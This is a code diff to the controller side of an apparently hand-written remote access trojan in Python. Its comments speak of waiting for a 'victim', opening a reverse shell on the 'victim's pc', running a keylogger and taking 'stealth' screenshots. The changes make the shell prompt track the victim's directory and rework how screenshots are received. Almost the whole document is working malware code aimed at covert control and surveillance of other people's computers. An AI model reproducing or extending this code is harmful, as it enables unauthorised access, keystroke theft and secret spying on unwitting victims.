@@ -2,24 +2,7 @@
 import socket,os, platform, time, encrypted_connection
 HOST = '0.0.0.0' #Set as every ip address can connect to the server.
 PORT = 6969
-"""class TcpInitialization(): #Initialize TCP connexion, and wait for a victim.
-    def __init__(self, HOST, PORT):
-        super().__init__()
-        self.HOST = HOST
-        self.PORT = PORT
-    def start (self) :
-        global server_socket
-        global client_socket
-        global client_ip
-        global client_port
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create a TCP server
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Help if connexion is lost
-        server_socket.bind((self.HOST, self.PORT))
-        server_socket.listen(5) #Define maximum connexions
-        print("\n[*] Listening on port " +str(self.PORT)+ ", waiting for connexions.")
-        client_socket, (client_ip, client_port) = server_socket.accept()
-        print("[*] Client " +client_ip+ " connected.\n")
-"""
+
 def consoleCleaner(enterToContinue): #When called, clear the console. If called with True argument, wait for enter to continue.
     if enterToContinue == True :
         try:
@@ -136,8 +119,10 @@ def KeyLogger(): #Keylogger menu -  If chosen, display the Keylogger menu and cr
         menu("keylogger")
         exitKeyLogger = selection("keylogger",input(">"))
 def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.
+    encrypter.send_message_server("getpath")
+    client_path = encrypter.receive_message_server()
     while True:
-        command = input(client_ip+ " > ")
+        command = input(client_path+ " > ")
         if((command == "stb") & (screenThatbeachAcces == False)) :
             print("Acces forbidden")
         elif((command == "stb") & (screenThatbeachAcces == True)):
@@ -158,8 +143,12 @@ def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that
                 if(len(command.split()) != 0):
                     encrypter.send_message_server(command)
                     #client_socket.send(command.encode("utf-8"))
-                    print(encrypter.receive_message_server())
+                    message = encrypter.receive_message_server()
                     #print(client_socket.recv(2048).decode("utf-8")+"\n")
+                    if "Directory :" in message :
+                        useless, client_path = message.split(" : ")
+                    else :
+                        print(message)
                 else:
                     print("continue")
                     continue
@@ -171,14 +160,15 @@ def screenThatbeach(): #If chosen, take a stealth screenshot of the victim and s
     #client_socket.send(("stb").encode("utf-8"))
     rawData = encrypter.receive_message_server()
     #rawData = client_socket.recv(1024)
+    print(rawData)
     data = rawData
     if str(data) == "capturing" :
         print("Capturing data")
         pic = open("new" + data + ".png", "wb")
-        img = encrypter.receive_picture_server()
+        img = bytes(encrypter.receive_picture_server())
         pic.write(img)
-        while not ("complete" in str(img)):
-            img = encrypter.receive_picture_server()
+        while not ("completed" in str(img)):
+            img = bytes(encrypter.receive_picture_server())
             pic.write(img)
         pic.close()
         os.system("qlmanage -p new" + data + ".png >/dev/null 2>&1" )
